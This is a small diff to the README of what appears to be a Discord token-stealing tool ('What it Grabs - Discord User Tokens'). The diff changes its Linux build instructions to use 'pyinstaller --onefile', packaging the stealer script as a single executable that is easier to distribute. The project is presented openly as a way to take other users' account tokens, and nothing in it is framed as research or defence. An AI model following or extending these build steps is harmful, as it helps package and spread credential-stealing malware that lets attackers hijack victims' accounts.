@@ -17,7 +17,7 @@ What it Grabs - ***Discord User Tokens***
 
 **Linux**
 
-1) In Terminal/Command Line do `sudo python -m pip install pyinstaller && pyinstaller AGV4.py`
+1) In Terminal/Command Line do `sudo python -m pip install pyinstaller && pyinstaller --onefile AGV4.py`
 
 # Our Website.
 
